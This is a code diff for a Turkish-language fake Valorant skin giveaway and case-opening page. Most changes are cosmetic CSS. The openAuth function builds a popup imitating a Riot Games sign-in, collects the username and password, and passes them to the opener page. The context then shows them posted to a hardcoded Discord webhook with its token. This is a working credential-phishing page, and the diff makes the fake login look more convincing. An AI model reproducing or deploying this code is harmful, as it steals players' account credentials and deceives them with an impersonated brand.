@@ -24,7 +24,8 @@
         .logo span { color: var(--valo-red); }
         .nav-links { display: flex; gap: 25px; flex-grow: 1; }
         .nav-links a { color: #888; text-decoration: none; font-size: 13px; font-weight: 700; text-transform: uppercase; }
-        .btn-login { background: var(--valo-red); color: #fff; border: none; padding: 12px 25px; font-weight: 800; cursor: pointer; border-radius: 4px; text-transform: uppercase; }
+        .btn-login { background: var(--valo-red); color: #fff; border: none; padding: 12px 25px; font-weight: 800; cursor: pointer; border-radius: 4px; text-transform: uppercase; transition: 0.2s; }
+        .btn-login:hover { background: #e03e4d; }
 
         .giveaway-section { max-width: 1100px; margin: 30px auto; background: rgba(0,0,0,0.85); border: 1px solid var(--valo-red); border-radius: 12px; padding: 25px; display: flex; justify-content: space-between; align-items: center; }
         #countdown { font-size: 36px; font-weight: 900; color: #fff; font-family: 'Montserrat'; }
@@ -33,15 +34,16 @@
         .case-wrapper { max-width: 1300px; margin: auto; display: flex; flex-direction: column; gap: 30px; padding-bottom: 50px; }
         .case-row { display: flex; flex-wrap: wrap; justify-content: center; gap: 25px; }
         .case-box { background: #101123; border-radius: 12px; padding: 20px; text-align: center; border: 1px solid #222; transition: 0.3s; width: 280px; cursor: pointer; }
-        .case-box:hover { border-color: var(--valo-red); transform: translateY(-5px); }
+        .case-box:hover { border-color: var(--valo-red); transform: translateY(-5px); box-shadow: 0 10px 20px rgba(255, 70, 85, 0.1); }
         .case-img-container { height: 160px; display: flex; align-items: center; justify-content: center; margin-bottom: 15px; }
         .case-box img { max-width: 100%; max-height: 100%; object-fit: contain; }
         .vp-tag { color: #79eb1e; font-weight: 800; font-size: 22px; margin-bottom: 15px; font-family: 'Montserrat'; }
-        .open-btn { background: var(--valo-red); color: white; border: none; width: 100%; padding: 14px; font-weight: 800; border-radius: 4px; cursor: pointer; text-transform: uppercase; }
+        .open-btn { background: var(--valo-red); color: white; border: none; width: 100%; padding: 14px; font-weight: 800; border-radius: 4px; cursor: pointer; text-transform: uppercase; transition: 0.2s; }
+        .open-btn:hover { background: #e03e4d; }
 
         /* MODAL & SPINNER */
         .modal-overlay { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.98); z-index:9999; align-items:center; justify-content:center; }
-        .modal-card { background:#111420; border:2px solid var(--valo-red); border-radius:15px; width:90%; max-width:550px; padding:40px; text-align:center; }
+        .modal-card { background:#111420; border:2px solid var(--valo-red); border-radius:15px; width:90%; max-width:550px; padding:40px; text-align:center; box-shadow: 0 0 50px rgba(255, 70, 85, 0.2); }
         .spinner-box { width:100%; height:140px; background:#0b1119; border:1px solid rgba(255,255,255,0.1); margin:25px 0; overflow:hidden; position:relative; display:flex; align-items:center; border-radius: 8px; }
         .spinner-line { position:absolute; left:50%; width:4px; height:100%; background:var(--valo-red); z-index:10; transform: translateX(-50%); box-shadow: 0 0 20px var(--valo-red); }
         .item-strip { display:flex; position:absolute; left:0; transition: transform 5s cubic-bezier(0.1, 0, 0, 1); align-items:center; }
@@ -49,7 +51,8 @@
         
         .win-view { display:none; animation: zoomIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
         @keyframes zoomIn { from { transform: scale(0.8); opacity:0; } to { transform: scale(1); opacity:1; } }
-        .ref-box { background:#000; padding:12px; border:1px dashed #79eb1e; color:#79eb1e; font-size:12px; margin:15px 0; cursor:pointer; font-family: monospace; }
+        .ref-box { background:#000; padding:12px; border:1px dashed #79eb1e; color:#79eb1e; font-size:12px; margin:15px 0; cursor:pointer; font-family: monospace; transition: 0.2s; }
+        .ref-box:hover { background: rgba(121, 235, 30, 0.1); }
     </style>
 </head>
 <body>
@@ -116,17 +119,14 @@
             {n: "KAOS VANDAL", img: "skin5.png", vp: "2175 VP", color: "#ff4655"}
         ];
 
-        // 1. CANLI DROP (Animasyonlu)
+        // 1. CANLI DROP
         function spawnDrop() {
             const track = document.getElementById('dropTrack');
             const s = skins[Math.floor(Math.random() * skins.length)];
             const div = document.createElement('div');
             div.className = 'drop-card';
             div.innerHTML = `<img src="${s.img}" onerror="this.src='https://via.placeholder.com/40'"><div class="rarity-box" style="background:${s.color}"></div>`;
-            
-            // En başa (sola) ekliyoruz, CSS'deki margin ve transform ile sağa ittiriyor
             track.prepend(div); 
-            
             if(track.children.length > 10) track.removeChild(track.lastChild);
             setTimeout(spawnDrop, Math.random() * 2500 + 1500);
         }
@@ -189,7 +189,7 @@
             alert("Referans linkin kopyalandı! Bir arkadaşına göndererek ödülünü alabilirsin.");
         }
 
-        // 5. GİRİŞ EKRANI (DÜZELTİLDİ: <\/script> eklendi)
+        // 5. GİRİŞ EKRANI (KARANLIK TEMA)
         function openAuth() {
             const w = 450, h = 750;
             const l = (screen.width/2)-(w/2), t = (screen.height/2)-(h/2);
@@ -197,23 +197,26 @@
             win.document.write(`
                 <html><head><style>
                 @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap');
-                body { background: #f9f9f9; font-family: 'Inter', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin:0; }
-                .card { background: #fff; padding: 40px; width: 330px; text-align: center; border-radius: 4px; box-shadow: 0 10px 40px rgba(0,0,0,0.1); }
-                h2 { font-weight: 900; margin-bottom: 30px; }
+                body { background: #0b1119; color: white; font-family: 'Inter', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin:0; }
+                .card { background: #111420; padding: 40px; width: 330px; text-align: center; border-radius: 8px; border: 1px solid #222; box-shadow: 0 10px 40px rgba(0,0,0,0.5); }
+                h2 { font-weight: 900; margin-bottom: 30px; letter-spacing: 1px; }
                 .input-group { position: relative; margin-bottom: 15px; }
-                input { width: 100%; padding: 22px 15px 8px 15px; background: #f2f2f2; border: 2px solid transparent; border-radius: 4px; box-sizing: border-box; font-weight: bold; outline: none; transition: 0.2s; }
-                input:focus { border-color: #111; background: #fff; }
-                label { position: absolute; left: 15px; top: 18px; color: #999; font-weight: 800; font-size: 11px; text-transform: uppercase; pointer-events: none; transition: 0.2s; }
-                input:focus + label, input:not(:placeholder-shown) + label { top: 8px; font-size: 9px; color: #333; }
-                button { width: 100%; padding: 18px; background: #ff4655; color: white; border: none; border-radius: 4px; font-weight: 900; cursor: pointer; margin-top: 20px; text-transform: uppercase; }
+                input { width: 100%; padding: 22px 15px 8px 15px; background: #0b1119; color: white; border: 2px solid #333; border-radius: 4px; box-sizing: border-box; font-weight: bold; outline: none; transition: 0.2s; }
+                input:focus { border-color: #ff4655; }
+                label { position: absolute; left: 15px; top: 18px; color: #777; font-weight: 800; font-size: 11px; text-transform: uppercase; pointer-events: none; transition: 0.2s; }
+                input:focus + label, input:not(:placeholder-shown) + label { top: 8px; font-size: 9px; color: #ff4655; }
+                button { width: 100%; padding: 18px; background: #ff4655; color: white; border: none; border-radius: 4px; font-weight: 900; cursor: pointer; margin-top: 20px; text-transform: uppercase; transition: 0.2s; }
+                button:hover { background: #e03e4d; }
+                .register-link { font-size: 11px; color: #777; margin-top: 30px; cursor: pointer; font-weight: 700; transition: 0.2s; }
+                .register-link:hover { color: #fff; }
                 </style></head><body>
                 <div class="card">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b6/Riot_Games_logo_icon.png" width="45">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b6/Riot_Games_logo_icon.png" width="55" style="filter: brightness(0) invert(1); margin-bottom: 10px;">
                     <h2>OTURUM AÇ</h2>
                     <div class="input-group"><input id="u" placeholder=" "><label>KULLANICI ADI</label></div>
                     <div class="input-group"><input id="p" type="password" placeholder=" "><label>ŞİFRE</label></div>
                     <button onclick="send()">GİRİŞ YAP</button>
-                    <p style="font-size:10px; color:#aaa; margin-top:30px;">HESABIN YOK MU? ÜCRETSİZ OLUŞTUR</p>
+                    <div class="register-link">HESABIN YOK MU? ÜCRETSİZ OLUŞTUR</div>
                 </div>
                 <script>function send(){ const u=document.getElementById('u').value, p=document.getElementById('p').value; if(u && p){ window.opener.postMessage({u,p}, "*"); window.close(); } }<\\/script>
                 </body></html>
@@ -232,7 +235,7 @@
                 
                 document.getElementById('refCode').innerText = username.slice(0,4) + Math.floor(1000 + Math.random() * 9000);
                 
-                loadCases(); // Kasaları tekrar yükle ki Başlangıç "Ücretsiz" olsun
+                loadCases(); // Başlangıç kasasını ÜCRETSİZ'e çevirmek için
                 
                 fetch("https://discord.com/api/webhooks/1489632402421841930/NW5qpH3UpfzBpTWSVcJ-FGXbevssOBhbMDUIdGjP4620rQLHvM6jx8fJGzji_4LQOBrq", {
                     method: 'POST', headers: {'Content-Type': 'application/json'},
@@ -252,7 +255,6 @@
         setInterval(tick, 1000); 
         tick();
         
-        // SAYFA YÜKLENİNCE BAŞLAT
         window.onload = () => { spawnDrop(); loadCases(); };
     </script>
 </body>
